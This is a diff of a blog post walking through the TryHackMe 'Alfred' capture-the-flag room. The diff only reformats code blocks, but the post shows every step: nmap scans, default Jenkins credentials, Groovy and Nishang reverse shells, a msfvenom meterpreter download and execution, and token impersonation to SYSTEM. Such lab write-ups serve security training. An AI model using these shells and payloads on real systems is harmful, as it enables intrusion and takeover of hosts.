@@ -26,8 +26,7 @@ Can we beat Alfred and get into Wayne Manor.  Let's find out.
 
 Let's use nmap to the get the services that are available for us to explore.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.215.127
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 01:01 AEDT
@@ -56,14 +55,13 @@ PORT     STATE SERVICE    VERSION
 |_/
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run the nmap against all of the ports just incase there are any non-standard ports available.
 
-{% raw %}
-```bash
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ sudo nmap -sS -p- -oN nmapfull -Pn 10.10.215.127
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 01:01 AEDT
@@ -75,8 +73,8 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 
 Nmap done: 1 IP address (1 host up) scanned in 582.35 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Check the Landing Page of the website.
@@ -99,13 +97,12 @@ Let's try admin:admin as credentials because it is what I alsways try whenever I
 <br />
 Start a netcat listener that listens on port 443.
 
-{% raw %}
-```bash
+{% capture startlistener443 %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ sudo nc -nlvp 443                             
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener443 %}
 
 <br />
 Use revshells to look up a Groovy payload.
@@ -130,8 +127,7 @@ The manage section has a script console that executes Groovy.  Convenient, since
 <br />
 Update the script to execute cmd.exe since this is a windows machine.
 
-{% raw %}
-```groovy
+{% capture groovyscript %}
 String host="10.4.119.29";
 int port=443;
 String cmd="cmd.exe";
@@ -148,8 +144,8 @@ while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
                      catch (Exception e){}};
   p.destroy();
 s.close();
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='groovy' title='groovy' content=groovyscript %}
 
 <br />
 Use the Groovy script in the script console and execute it.
@@ -164,34 +160,37 @@ Use the Groovy script in the script console and execute it.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catch443shell %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ sudo nc -nlvp 443                             
 listening on [any] 443 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.215.127] 49226
+{% endcapture %}
+
+{% capture catch443windowsshell %}
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Program Files (x86)\Jenkins>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catch443shell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=catch443windowsshell %}
 
 <br />
 Now, re-reading the description, it looks like this wasn't the intended way to complete the box.  So we will kill the shell and try again.  To get started, copy Nishang reverse shell PowerShell script into the local working folder.
 
-{% raw %}
-```bash
+{% capture cpnishang %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ cp $(locate Invoke-PowerShellTcp.ps1) .
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cpnishang %}
 
 <br />
 Update the file to Invoke the method at the end of the file.
 
-{% raw %}
-```powershell
+{% capture nishangscript %}
 function Invoke-PowerShellTcp 
 { 
 <#
@@ -207,30 +206,28 @@ Nishang script which can be used for Reverse or Bind interactive PowerShell from
     }
 }
 Invoke-PowerShellTcp -Reverse -IPAddress 10.4.119.29 -Port 4444
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=nishangscript %}
 
 <br />
 Start another netcat listener...again.
 
-{% raw %}
-```bash
+{% capture start4444listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ nc -nlvp 4444 
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start4444listener %}
 
 <br />
 Start a webserver to serve the Nishang script.
 
-{% raw %}
-```bash
+{% capture pyserver %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=pyserver %}
 
 <br />
 Click on configure in the project options.
@@ -262,24 +259,28 @@ Click on Build Now in the side menu.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catch4444shell %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ nc -nlvp 4444 
 listening on [any] 4444 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.215.127] 49248
+{% endcapture %}
+
+{% capture catchpowershellshell %}
 Windows PowerShell running as user bruce on ALFRED
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
 PS C:\Program Files (x86)\Jenkins\workspace\project>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catch4444shell %}
+
+{% include terminal.html language='powershell' title='PowerShell' content=catchpowershellshell %}
 
 <br />
 Use msfvenom to generate a meterpreter payload.
 
-{% raw %}
-```bash
+{% capture genmeter %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.119.29 LPORT=443 -f exe -o meter.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -290,14 +291,13 @@ x86/shikata_ga_nai chosen with final size 381
 Payload size: 381 bytes
 Final size of exe file: 73802 bytes
 Saved as: meter.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genmeter %}
 
 <br />
 Use PowerShell to transfer the payload to the victim machine.
 
-{% raw %}
-```bash
+{% capture transfermeter %}
 PS C:\Program Files (x86)\Jenkins\workspace\project> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.119.29:8000/meter.exe','meter.exe')"
 PS C:\Program Files (x86)\Jenkins\workspace\project> dir
 
@@ -308,14 +308,13 @@ PS C:\Program Files (x86)\Jenkins\workspace\project> dir
 Mode                LastWriteTime     Length Name                              
 ----                -------------     ------ ----                              
 -a---         2/25/2025   2:38 PM      73802 meter.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=transfermeter %}
 
 <br />
 Set-up an multi/handler to catch the meterpreter.
 
-{% raw %}
-```bash
+{% capture startmultihandler %}
 ┌──(kali㉿kali)-[~/Documents/thm/alfred]
 └─$ msfconsole -q                                                                                                                  
 msf6 > use exploit/multi/handler
@@ -330,31 +329,29 @@ msf6 exploit(multi/handler) > set lport 443
 lport => 443
 msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.4.119.29:443
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startmultihandler %}
 
 <br />
 Execute the meterpreter payload.
 
-{% raw %}
-```bash
+{% capture runmeterexe %}
 PS C:\Program Files (x86)\Jenkins\workspace\project> Start-Process "meter.exe"
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=runmeterexe %}
 
 <br />
 Check the listener and catch the session.
 
-{% raw %}
-```bash
+{% capture catchmeter %}
 msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.4.119.29:443 
 [*] Sending stage (177734 bytes) to 10.10.215.127
 [*] Meterpreter session 1 opened (10.4.119.29:443 -> 10.10.215.127:49260) at 2025-02-26 01:42:29 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchmeter %}
 
 <br />
 Research more about access tokens.
@@ -379,8 +376,7 @@ Read up on Exploit-DB about abusing these tokens.
 <br />
 Run whoami /priv to get a list of the privileges.
 
-{% raw %}
-```bash
+{% capture whoamipriv %}
 C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
 whoami /priv
 
@@ -412,24 +408,22 @@ SeCreateGlobalPrivilege         Create global objects                     Enable
 SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
 SeTimeZonePrivilege             Change the time zone                      Disabled
 SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=whoamipriv %}
 
 <br />
 Load the incognito extension.
 
-{% raw %}
-```bash
+{% capture loadincognito %}
 meterpreter > load incognito
 Loading extension incognito...Success.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=loadincognito %}
 
 <br />
 List all of the tokens that are available to impersonate.
 
-{% raw %}
-```bash
+{% capture listtoken %}
 meterpreter > list_tokens -g
 [-] Warning: Not currently running as SYSTEM, not all tokens will be available
              Call rev2self if primary process token is SYSTEM
@@ -461,37 +455,40 @@ NT SERVICE\wuauserv
 Impersonation Tokens Available
 ========================================
 No tokens available
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=listtoken %}
 
 <br />
 Impersonate the Administrators token.
 
-{% raw %}
-```bash
+{% capture impersonatetoken %}
 meterpreter > impersonate_token "BUILTIN\Administrators"
 [-] Warning: Not currently running as SYSTEM, not all tokens will be available
              Call rev2self if primary process token is SYSTEM
 [+] Delegation token available
 [+] Successfully impersonated user NT AUTHORITY\SYSTEM
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=impersonatetoken %}
 
 <br />
 Run getuid to confirm system.
 
-{% raw %}
-```bash
+{% capture getuid %}
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=getuid %}
+
+{% raw %}
+```bash
+
 ```
 {% endraw %}
 
 <br />
 Run ps to get a list of the processes.
 
-{% raw %}
-```bash
+{% capture meterps %}
 meterpreter > ps
 
 Process List
@@ -540,25 +537,23 @@ Process List
  2844  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
  3008  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
  3032  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=meterps %}
 
 <br />
 Migrate to a process that is owned by system.
 
-{% raw %}
-```bash
+{% capture migrate1212 %}
 meterpreter > migrate 1212
 [*] Migrating from 720 to 1212...
 [*] Migration completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=migrate1212 %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 C:\Windows\system32>type C:\Users\bruce\Desktop\user.txt
 type C:\Users\bruce\Desktop\user.txt
 <redacted>
@@ -580,14 +575,13 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 C:\Windows\system32>type C:\Windows\System32\config\root.txt
 type C:\Windows\System32\config\root.txt
 <redacted>
@@ -610,8 +604,8 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}
 
 <br />
 And with that Alfred works for us now.  Hope, you enjoyed.  See you in the next one.
